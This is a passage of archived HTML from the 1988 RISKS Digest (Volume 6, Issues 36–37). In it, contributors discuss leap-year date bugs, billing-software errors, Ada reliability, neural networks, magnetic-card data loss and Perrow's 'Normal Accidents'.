man was billed for both procedures.  (To be fair, if he *had* been pregnant,
he certainly would have required a C-sec...).  Medicare objected to the
bill, of course, which was how we found out about it.

The risk here is two-fold.  We were using an old system that had been poorly
designed from the start.  It's true that the software that handles the billing
should be smarter, but like a lot of businesses, we couldn't afford to re-write
it (ever try to scratch by on Medicare payments?).  And the people who used
the software were either unable or unwilling to understand its limitations.

Hackers love to talk about the twenty billion lines of Jurassic COBOL that
run the world.  As time goes by, and networks and databases put more
information on-line, the flaws of old code are going to become more apparent.

Mike Olson, Britton Lee, Inc.
(...!ucbvax!mtxinu!blia!mao)  	(olson@ucbvax.berkeley.edu)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Slippery slopes &amp; relative risk
</A>
</H3>
<address>
Stephen Schaefer 
&lt;<A HREF="mailto:sps@mcnc.org">
sps@mcnc.org
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 17:46:26 EST
</i><PRE>

My view of this debate is that there are two different objects being pursued,
and perhaps mistaken for one another.  The slippery slope is one paradigm with
which to anticipate possible risks.  What David Thomasson would like to do is
go beyond the identification of possibilities to a ranking of risks, that is, a
MEASUREMENT of benefits and pitfalls, from which a rational judgement can be
attained.  The piteous condition of the real world is that the cost of
measuring risks often outweighs the possible benefit of a rational choice.  The
confusion can become even more vicious when the cost of measurement is itself
highly uncertain.  Darkness heaps upon darkness.

So how do we cope?  Badly, of course.  People die in accidents caused by
unexpected features, and people die in accidents easily preventable by the
appropriate widget.  Different cultures and different individuals adopt
different attitudes toward experimentation in different domains, choosing high
risk/high payoff or low risk/sure payoff.  One technique associated with
western culture is to let individuals choose their risks, and then, after some
data come in (some die, some get rich), observers adopt the beneficial and
reject the detrimental.  The whole afair is a chaotic mess, with no end of
decisions based on insufficient data and irrational likes and dislikes.  The
approach is obviously inappropriate to instances where replication is
impractical - nuclear war/nuclear defense immediately leaps to mind.  But we
profit so well from such ``scientific method'' that no other approach seems to
satisfy the void when it is unavailable.

Societies less opulent than ours have a propensity toward tradition and moral
dicta that may reflect their smaller margin for error -- or the causality may
lie in the opposite direction, with our larger margin for error being the
result of more ristk taking.  For the moment, life in the fast change lane is
serving us well.  To continue to be successful, we must develop methods
applicable beyond the scope of practical experience; we must know when to apply
them; and we must have the will to apply them.  These topics are the concerns
of metaphysics, epistemology, and ethics, and we must have high hopes for Mr.
Thomasson's philosophy.  It is that which is not subject to engineering
solutions which most threatens our society.  Most readers on this list are
engineers, however, and we work from the opposite direction.  Our duty is to
measure wherever we can, and, failing that, to present as comprehensive a
description of the possibilities as we can.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
 Re: Disappearing Skills [RISKS 6.35]
</A>
</H3>
<address>
 Ronald J Bottomly 
&lt;<A HREF="mailto:Bottomly@DOCKMASTER.ARPA">
Bottomly@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 09:31 EST
</i><PRE>

  &gt;&gt;   What do you think?  Is technology weakening us by causing
  &gt;&gt;   important skills to atrophy?  Or is our educational system
  &gt;&gt;   "irrelevant"?  Where does one draw the line?

It is not so much the SKILL (ability to multiply) that will atrophy; it is
the ability to think that will atrophy.

You were not taught insciption of cunieform or how to trim a quill pen when
learning to write because of the advent of improved MEANS of writing (eg.
the pencil).  However, there was still the necessity of learning the skill
of writing.

I never learned how to multiply by using a slide rule (what with the advent
of calculators).  And I will use a calculator without hesitation if one is
immediately available.  But if one is not available, I can just as readily
multiply by hand.  The only cost to me is time.

I am not condoning technological stagnation, but I am condemning absolute
technological reliance.  The need for multiplication will probably exist as
long as mankind exists; but it seems dangerous (RISKy?) to come to rely upon
calclators (or whatever will succeed them) to perform this multiplication.

Technological advances should save us time; they should not "save" us the
"bother" of being able to think.
                                              Ron Bottomly

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
     Invalid dates
</A>
</H3>
<address>
Ross Patterson 
&lt;<A HREF="mailto:A024012%RUTVM1.BITNET@CUNYVM.CUNY.EDU">
A024012%RUTVM1.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Thu, 03 Mar 88 09:31:30 EST
</i><PRE>

    February 31, 1988 is at least partially understandable, given the
atrocious algorithms sometimes used for date manipulation.  However, on
February 29, 1980, IBM's VS/APL system reported the date as March 0, 1980!
The user who called us to report it asked if we'd changed the default for
the )ORIGIN.  I guess it made sense, given an APL mindset.

Ross Patterson, Rutgers University

</PRE>
<HR><H3><A NAME="subj10.2">
     Invalid dates
</A>
</H3>
<address>
Lee Ridgway 
&lt;<A HREF="mailto:RIDGWAY@MITVMA.MIT.EDU">
RIDGWAY@MITVMA.MIT.EDU
</A>&gt;
</address>
<i>
Thu, 03 Mar 88 10:13:50 EST
</i><PRE>

I just noticed that the "due date" on the computer-generated slip for a bank
loan of mine says "2/30/88".

On another note, a lawyer-friend of mine says his office sends out a warning to
its staff every leap year, on 2/1, to check all legal documents that may be
completed on 2/29.  Seems they did get caught several years ago with a
mega-buck financial contract that expired on the 20th anniversary from the date
of signing, which was---- 2/29.  Let's see, 80 years of interest on $5 million,
at 12%...

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Neural networks and P1
</A>
</H3>
<address>
Dave Pare
&lt;<A HREF="mailto:mr-frog@amos.ling.ucsd.edu ">
mr-frog@amos.ling.ucsd.edu 
</A>&gt;
</address>
<i>
Wed, 2 Mar 88 16:08:14 PST
</i><PRE>

At the current state of technology, neural networks are nothing to be
feared!  The idea that "some neural network" could take over large
sections of the ARPAnet seems ludicrous; anyone who has ever implemented
a neural network can tell you that it is painful enough trying to teach
the network how to "learn" an XOR operation.

What people mean when they say neural networks "learn" is that the
network has the ability to configure itself so it recognizes patterns.
Typically, the experimenter takes many kinds of examples of input
(bit patterns, samples of human speech, etc) and runs them through the
network.  The network is told the right answer for each input, and the
idea is that from some subset of input, the network can generalize
and apply its pattern recognizing capability to provide the correct answer
for input that wasn't explicitly presented.

Depending on the complexity of the pattern, this process can take hundreds
or thousands of presentations, eating up huge amounts of CPU time.  The
person I work for managed to use UCSD's entire allocation of CRAY-XMP time
for a quarter by running his neural network simulator for 24 hours.
That's the closest to a takeover that I've heard of!

It is true that the learning approach does seem to better reflect the
way people actually learn, but the technology is still quite new and
mostly unexplored.

Dave Pare, Center for Research in Language, UCSD

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
 Ada-caused bugs?                  [Another old topic; new question]
</A>
</H3>
<address>
Jerry Harper 
&lt;<A HREF="mailto:mcvax!euroies!jharper@uunet.UU.NET">
mcvax!euroies!jharper@uunet.UU.NET
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 10:52:41 GMT
</i><PRE>

1.  Am I correct in thinking that several (two?) missiles were recently
    destroyed on launch each of which had their guidance systems
    coded in Ada?  Were the problems which forced the destruction of
    the missiles the result of bad software design or some inherent
    ambiguity in Ada syntax?

2.  I spotted but unfortunately left unlogged a report somewhere which
    gave an account of a talk by a leading scientist (name?) in the
    military technology area who expressed grave reservations about the
    design of Ada.  I *think* the report mentioned that the person
    expressed little confidence in guidance systems coded in Ada.

3.  Is the Pentagon insisting on Ada being the standard for all military
    software projects?  

Jerry Harper, Merrion Gates Software (Logic Programming)
Merrion House, Merrion Road, Dublin 4, IRELAND.  netwise: jharper@euroies.uucp

   [Ada is by no means a panacaea.  It has some benefits -- type-checking,
   import/export controls, etc. -- that can contribute to safer programming.
   But its complexity makes it ripe for misuse.  It is nominally mandated for
   all military embedded systems, except that various limitations have 
   resulted in its being eschewed in some security-community applications.
   Can anyone provide a definitive answer to Question 1?  I don't recall
   anything that might have implicated Ada!  PGN]

</PRE>
<A NAME="subj13"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj13.1">
Aerospace Computer Security Applications Conf. - Call for Papers
</A>
</H3>
<address>
Marshall D. Abrams 
&lt;<A HREF="mailto:abrams@mitre.arpa">
abrams@mitre.arpa
</A>&gt;
</address>
<i>
Tue, 01 Mar 88 10:52:53 EST
</i><PRE>
Organization: The MITRE Corp., Washington, D.C.

Call for Papers, Fourth Aerospace Computer Security Applications Conference
December 12-16, 1988, Sheraton World Hotel, Orlando, Florida

Operational requirements for civil and military systems under development
increasingly stress the necessity for information to be readily accessible
to users and operators.  This produces an apparent conflict with policies
and directives which require total protection of system data from
compromises of privacy, confidentiality, and integrity.  Accomplishing both
of these sets of requirements requires the application of the maturing
technology of computer security to new systems throughout their development
cycle.  In addition, operational approaches to satisfy system requirements
and accommodate the implementation of engineering technology require
intensified research and development.

This conference will explore technology applications in two complementary
aspects:  first, the policy issues and operational requirements for both
civil and military systems; and second, the hardware and software tools and
techniques being developed to satisfy system requirements.  Special emphasis
will be placed on specific examples of systems applications.

A three-day technical conference exploring the application of computer
security technology will be preceded by two days of tutorials dealing with
policy matters, technology applications, and other areas.  Introductory and
advanced surveys will be offered as well as advanced courses exploring
specialized technological areas.

Areas of Interest Include: Trusted DBMSs, Operating System, and Network
Security, Current and Future Trusted System Technology, Space Station
Requirements, Certification, Evaluation and Accredition, Policy and Management
Issues, Advanced Architectures, C3I Systems, Risk/Threat Assessments

Unclassified papers or unclassified abstracts of classified papers must be
mailed before 20 May, 1988, to Dr. William T. Bisignani, Technical Program
Chairman, Booz-Allen &amp; Hamilton Inc., 4330 East-West Highway, Bethesda, MD
20814

Tutorial Proposals including a detailed outline and a resume of presentor(s)
must be mailed before 20 May, 1988 to Dr. Dixie B. Baker, Tutorial Program 
Chairwoman, The Aerospace Corporation, P.O. Box 92957, 2350 East El Segundo
Blvd, El Segundo, CA 90245-4691.

For more information or to receive future mailings, please contact the
conference chairman, Dr. Marshall D. Abrams, phone: (703) 883-6938, The MITRE
Corporation, 7525 Colshire Drive, Mail Stop Z670, Mc Lean, VA 22102, E-mail
address: abrams@mitre.arpa

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.35.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.37.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-73</DOCNO>
<DOCOLDNO>IA012-000130-B025-64</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.37.html 128.240.150.127 19970217015920 text/html 22779
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:57:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 37</TITLE>
<LINK REL="Prev" HREF="/Risks/6.36.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.38.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.36.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.38.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 37</H1>
<H2>  Sunday 6 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Finagling Prescription Labels 
</A>
<DD>
<A HREF="#subj1.1">
Robert Kennedy
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Opus bulletin boards fail worldwide on 1 March 1988 
</A>
<DD>
<A HREF="#subj2.1">
Thomas Fruin
</A><br>
<A HREF="#subj2.2">
Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Social Security Administrator hides computer problems 
</A>
<DD>
<A HREF="#subj3.1">
Ivan M. Milman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  A320 Airbus Fly by Wire System 
</A>
<DD>
<A HREF="#subj4.1">
Geoff Lane
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Black Monday not caused by program trading, MIT's Thurow asserts.     
</A>
<DD>
<A HREF="#subj5.1">
LT Scott A. Norton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Ada-caused bugs? 
</A>
<DD>
<A HREF="#subj6.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Magnetic card sensitivity test (a sort of) 
</A>
<DD>
<A HREF="#subj7.1">
Matti Aarnio
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Perrow's "Normal Accidents" 
</A>
<DD>
<A HREF="#subj8.1">
Brian Randell
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Finagling Prescription Labels
</A>
</H3>
<address>
Robert Kennedy 
&lt;<A HREF="mailto:jrk%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK">
jrk%computer-lab.cambridge.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 10:57:52 GMT
</i><PRE>

A recent RISKS posting about adverts appended to TELEX messages reminded me
of a recent experience I had with the label on a bottle of prescription
medicine.

The instructions for use, the name, the Doctor's name, and all the important
stuff appeared intact, but down at the bottom of the label, in compressed
print (the rest of the label had been printed in a "normal" dot-matrix style)
was the question "WILL THIS COMPUTER WORK?"

At first, I just thought it was funny -- someone having a good time with some
spare space on the label. But then I realized that maybe prescription labels
aren't the best thing to be monkeying around with...

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Opus bulletin boards fail worldwide on 1 March 1988
</A>
</H3>
<address>
Thomas Fruin
&lt;<A HREF="mailto:<FRUIN%HLERUL5.BITNET@CUNYVM.CUNY.EDU> ">
&lt;FRUIN%HLERUL5.BITNET@CUNYVM.CUNY.EDU&gt; 
</A>&gt;
</address>
<i>
Sat, 5 Mar 88 01:51 N
</i><PRE>

Here's another February 29th/leap year story for this year:

On March 1st, 1988, every PC-based bulletin board running the lastest version
of the Opus bulletin board program (version 1.03a) suddenly decided that every
caller would get only 0 minutes logon time.  When this happened to the BBS I
run, I didn't immediately suspect it was one of those leap-year bugs, but when
I tried to logon to a friend's board, and got the TIME LIMIT message, I was
pretty sure.  And a day or so later, it became clear that this was happening to
the hundreds of Opus boards all over the world.

Fortunately these bulletin boards are mostly for hobbyists, and don't pose such
a great RISK when they fail, but it is stupid.  Anyway, since these Opus boards
are all linked via the FidoNet, a utility to patch the Opus object code has
been sent out all over the world very fast.  That's the advantage of computers
I suppose ...
                                        Thomas Fruin

     [... and a disadvantage too -- if Trojan horses can breed that fast.  PGN]

</PRE>
<HR><H3><A NAME="subj2.2">
Bug in leap-year code dogs Fidonet systems
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:coherent!dplatt@ames.arc.nasa.gov ">
coherent!dplatt@ames.arc.nasa.gov 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 5 Mar 88 03:56:42 GMT
Organization: Coherent Thought Inc., Palo Alto CA

I logged onto my favorite local bulletin-board system (Mailcom, in Palo Alto)
this afternoon, after not having been able to contact it for several days.  A
message in the sign-on banner reported that Fidonet bulletin boards
country-wide (and, I presume, world-wide) were seriously disrupted by a bug in
the date logic; it appears that the code didn't properly cope with Leap Year
Day (last Monday).  Mailcom was apparently off the air for three days, until a
patch arrived.  [...]  I imagine that the offending code was less than 4 years
old.
                                   Dave Platt
  UUCP: ...!{ames,sun,uunet}!coherent!dplatt     DOMAIN: dplatt@coherent.com

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Social Security Administrator hides computer problems
</A>
</H3>
<address>
Ivan M. Milman
&lt;<A HREF="mailto:ivan@sally.utexas.edu ">
ivan@sally.utexas.edu 
</A>&gt;
</address>
<i>
Sun, 6 Mar 88 18:14:27 CST
</i><PRE>

[Excerpted without permission from  Saving Social Security, March 1988]

"Rumors abound that Social Security Commissioner Dorcas Hardy may be on her way
out..."  "The latest example of Hardy's style came January 7 when she arranged
for top General Accounting Office(GAO) officials to tour her "showcase"
computerized service-center in Washington, D.C.  But an hour before the tour,
none of the computers would work - which is what GAO has already concluded
about the entire system.  Rather than allow the GAO officials to witness this
embarassment, however, Hardy ordered all Social Security Service Centers in
Pennsylvania, Maryland, Virginia and West Virginia to shut down computer
printing operations to free the D.C. center to operate without problems,
Seniors throughout those states had to wait for service so Hardy could create
the illusion the system was trouble-free.  Hardy has insisted that the flawed
computer system justifies a 21 percent reduction in Social Security staffing.."

Ivan M. Milman

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
   A320 Airbus Fly by Wire System
</A>
</H3>
<address>
"Geoff. Lane. Phone UK-061 275 6051" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Fri, 04 Mar 88 10:46:05 GMT
</i><PRE>

In the Dec 12th, 1987 issue of Flight International there is a report by
Harry Hopkin on his experiences of flying a A320 in various failure modes.
He reports that even a simulated total electrical failure the aircraft is
still flyable by means of the rudder and pitch trim alone.

Geoff Lane, UMRCC

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Black Monday not caused by program trading, MIT's Thurow asserts.
</A>
</H3>
<address>
"LT Scott A. Norton, USN" 
&lt;<A HREF="mailto:4526P%NAVPGS.BITNET@CUNYVM.CUNY.EDU">
4526P%NAVPGS.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Fri, 04 Mar 88 01:30:45 PST
</i><PRE>

In a one-page article in the February-March issue of Technology Review,
MIT's Lester C. Thurow, Dean of the Sloan School of Management, states
that neither stock-index arbitrage or portfolio insurance caused the
stock market to fall in October.  He compares October's panic with
some classic panics, such as the Amsterdam tulip-bulb craze of 1637
and the London South Sea Bubble of 1720, as well as the crash of 1929.

For the cause of panic on October 19, Thurow points immediately to "herd
panic", and ultimately to the difference in price/earnings ratio between the
stock market and bonds.  The final motion that caused a loss of heart by stock
investors was a trend of interest rates up to defend a weak dollar.  This
caused bonds to look even more attractive to stock owners.

Although Thurow explains how programmed trading does not differ essentially
from the trades a human arbitrageur would make, he does not discuss the effect
that the greater speed of programmed trading had on the market's volitility.

LT Scott A. Norton, USN, Naval Postgraduate School, Monterey, CA 93943-5018
4526P@NavPGS.BITNET   4526P@NPS.ARPA

   [Have you herd panic?  [And have you heard panic?]  PGN]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Ada-caused bugs?    [<A HREF="/Risks/6.36.html">RISKS-6.36</A>]
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sun, 6 Mar 88 00:11:03 EST
</i><PRE>

&gt; [Ada's] complexity makes it ripe for misuse.  It is nominally mandated for 
&gt; all military embedded systems, except that various limitations have resulted 
&gt; in its being eschewed in some security-community applications...       [PGN]

Considering Ada's application domain (and my personal dislike for Ada), I
laughed long and hard when I noticed the following quote in the first issue of
the new journal "Computing Systems" (Marc H. Donner and David H.  Jameson,
"Language and Operating System Features for Real-time Programming", Computing
Systems vol 1 number 1, winter 1988, pp 33-62):

     Ill-chosen abstraction is particularly evident in the design of
     the Ada runtime system.  The interface to the Ada runtime system 
     is so opaque that it is impossible to model or predict its 
     performance, making it effectively useless for real-time systems.

(Donner and Jameson are with the IBM Thomas J. Watson Research Center;
the paper is very interesting.  Computing Systems is being published by
U of California Press for the Usenix Association.)

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     Magnetic card sensitivity test (a sort of)
</A>
</H3>
<address>
Matti Aarnio 
&lt;<A HREF="mailto:FYS-MA%FINTUVM.BITNET@CUNYVM.CUNY.EDU">
FYS-MA%FINTUVM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 23 Feb 88 15:39:43 EET
</i><PRE>
Organization:  University of Turku, Finland

    My laboratory got some questions from the local newspaper concerning
magnetic card sensitivity against magnetic locks used on purses.  We got their
suspected purse, and measured its magnetic field.  Because of magnet
construction and gauge structure, I have my doubts about this value, but it
seems to be AT LEAST 35 mT at about 5mm distance of magnet poles (that
particular had structure similar to loudspeakers magnets).  This is just single
measurent from single sample.  (BTW: Earth field is about 5 mT)

    Then I made simple experiment:  Blank formatted PC diskette (360kB) was
briefly touched with a magnet (single point).  Then the diskette was read thru
as far as sectors were readable.  (Diskette was reformatted and verified
between each individual test.  Reading was done with MSDOS Debug.)

    Every time, when the diskette was touched to the magnet on top of it, it
did lose some sectors, e.g., the field was affected enough.  But never, when
the diskette was put inside the purse (even next to magnet), was there any data
loss.  The affected area was small, only few millimeters in diameter, thus data
loss didn't happen on every track.  This means also that, to 'destroy' the
magnetic stripe, one must hit on it, not just within an inch or so.

    While discussing more about how this journalist did handle her card, we
came to the conclusion that at least with this kind of lock magnets there is a
simple possibility to accidentally handle the card above the magnet.  She did
open her purse, took her card out, and put it on top of the purse (and magnet),
kept it there for a moment (took some papers from purse), and then handled them
to shop clerk. (Small shops don't have electronic card readers even today, but
those shops are becoming rare.)

    As you understand, this test isn't scientifically solid (made within 30
minutes), but it does give some idea about how sensitive these things are.  I
also made an assumption that the diskette and the magnetic card do contain
similarly sensitive material.  What this does prove is that, with a specific
(and quite common) type of magnetic lock, it is possible to damage data on
diskette.

Matti Aarnio, University of Turku; Wihuri Physical Laboratory, 
SF-20500 TURKU; FINLAND   (Phone:+358-21-645917)  BITNET: FYS-MA at FINTUVM

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Perrow's "Normal Accidents"
</A>
</H3>
<address>
Brian Randell 
&lt;<A HREF="mailto:Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK">
Brian_Randell%newcastle.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 19:08:46 GMT
</i><PRE>

I've recently been reading "Normal Accidents", by Charles Perrow, (Basic Books,
New York, 1984), which I received through inter-library loans after such a long
delay that I can't remember whether it was through RISKS that I first learnt
about it, though I certainly have seen it referenced there since. However I'm 
not aware of it ever having been extensively discussed in RISKS, so although it
contains few explicit references to computers, and is written from the
viewpoint of a social rather than a computer scientist, I thought the following
quotes from it might be of interest:

 "Complex systems are characterized by:
 * proximity of parts or units that are not in a production sequence;
 * many common mode connections between components (parts, units or subsystems)
   not in a production sequence;
 * unfamiliar or unintended feed-back loops;
 * many control parameters with potential interactions;
 * indirect or inferential information sources; and
 * limited understanding of some processes.

 "Complex systems are not necessarily high risk systems with catastrophic 
 potential; universities, research and development firms, and some government 
 bureaucracies are complex systems . . ."

 "In complex systems, not only are unanticipated interdependencies more likely
 to emerge because of a failure of a part or a unit, but those operating the
 system (or managing it) are less likely, because of specialized roles and
 knowledge, to predict, note, or be able to diagnose the interdependency before
 the incident escalates into an accident."

 "On the whole, we have complex systems because we don't know how to produce
 the output through linear systems. If these complex systems have catastrophic
 potential, then we had better consider alternative ways of getting the
 product, or abandoning the product entirely."

 "Tight coupling is a mechanical term meaning that there is no slack or buffer
 or give between two items. What happens in one directly effects what happens
 in the other....Elaborating the concept as used by organizational theorists
 will allow us to examine the responsiveness of systems to failures, or to
 shocks.  Loosely coupled systems, whether for good or ill, can incorporate
 shocks and failures and pressure for change without destabilization. Tightly
 coupled systems will respond more quickly to these perturbations, but the
 response may be disastrous. Both types of systems have their virtues and
 vices."

 "Since failures occur in all systems, means to recovery are critical. One
 should be able to prevent an accident, a failure of a part or a unit, from
 spreading.  All systems design-in safety devices to this end. But in tightly
 coupled systems, the recovery aids are largely limited to deliberate,
 designed-in aids, such as engineered-in safety devices..."

The above quotations are from the main analytical chapter in the book.
Subsequent chapter titles are: 'Petrochemical Plants', 'Aircraft and Airways',
'Marine Accidents', 'Earthbound Systems: Dams, Quakes, Mines and Lakes', and
'Exotics:  Space, Weapons and DNA'.

The final chapter in entitled 'Living with High Risk Systems', from which the
following quotes come:

 "I propose using our analysis to partition the high-risk systems into three
 categories. The first would be systems that are hopeless and should be
 abandoned because the inevitable risks outweigh any reasonable benefits
 (nuclear weapons and nuclear power); the second, systems that we are unlikely
 to be able to do without but which could be made less risky by considerable
 effort (some marine transport), or where the expected benefits are so
 substantial that some risks should be run, but not as many as we are now
 running (DNA research and production). Finally, the third group includes those
 systems which, while hardly self-correcting in all respects, are
 self-correcting to some degree and could be further improved with quite modest
 efforts (chemical plants, airlines and air traffic control, and a number of
 systems which we have not examined carefully but should mention here, such as
 mining, fossil fuel power plants, highway and automobile safety). The basis
 for these recommendations rests not only with the system accident potential
 for catastrophic accidents, but also the potential for component failure
 accidents. I think the recommendations are consistent with public opinions and
 public values."

 "My recommendations must be judged wrong if the science of risk assessment as 
 currently practiced is correct. Current risk assessment theory suggests that
 what I worry about most (nuclear power and weapons) has done almost no harm to
 people, while what I would leave to minor corrections (such as fossil fuel
 plants, auto safety, and mining) has done a great deal of harm." 

This leads on to a very interesting critique of risk assessment, from which I
have extracted:

 "While not as dangerous as the systems it analyzes, risk assessment carries
 its own risks ..."

 "When societies confront a new or explosively growing evil, the number of risk
 assessors probably grows - whether they are shamans or scientists. I do not
 think it an exaggeration to say that their function is not only to inform and
 advise the masters of these systems about the risks and benefits, but also,
 should the risk be taken, to legitimate it and to reassure the subjects."

 "This is a very sophisticated field. Mathematical models predominate;
 extensive research is conducted ... yet it is a narrow field, cramped by the
 monetarization of social good."

 "The risk assessors, then, have a narrow focus that all too frequently (but
 not always) conveniently supports the activities elites in the public and
 privare sector think we should engage in. For most, the focus is on dollars
 and bodies, ignoring social and cultural criteria. The assessors do not
 distinguish risks taken for private profits from those taken for private
 pleasures or needs, though the one is imposed, the other to some degree
 chosen; they ignore the question of addiction, and the distinction between
 active risks, where one has some control, and passive risks; they argue for
 the importance of risk but limit their endorsement of approved risks to the
 corporate and military ones, ignoring risks in social and political matters."

Finally, I asked Jim Reason (Professor of Psychology at Manchester, whose work
on human errors I have commented on in RISKS earlier) for his opinion of
Perrow's book, and got the following reply:

 "I was very impressed by the Perrow book.  It provided an extremely
 interesting systems view on accidents (i.e. from a sociological perspective),
 and certainly influenced my thinking quite markedly.  There is much in it that
 I disagree with -- I'm not entirely happy with the Luddite solution proposed
 at the end, for example -- nor do I entirely agree with his dismissal of the
 human error contribution.  But it's an excellent read.  You don't have to wade
 through the case studies.  The meat is easily discernible in about two 
 chapters."

          [A quick grep shows Perrow mentioned in <A HREF="/Risks/1.37.html">RISKS-1.37</A>, 1.45, 2.44, 3.27,
          5.14, and 5.62.  Quite popular!  There is much that can be learned,
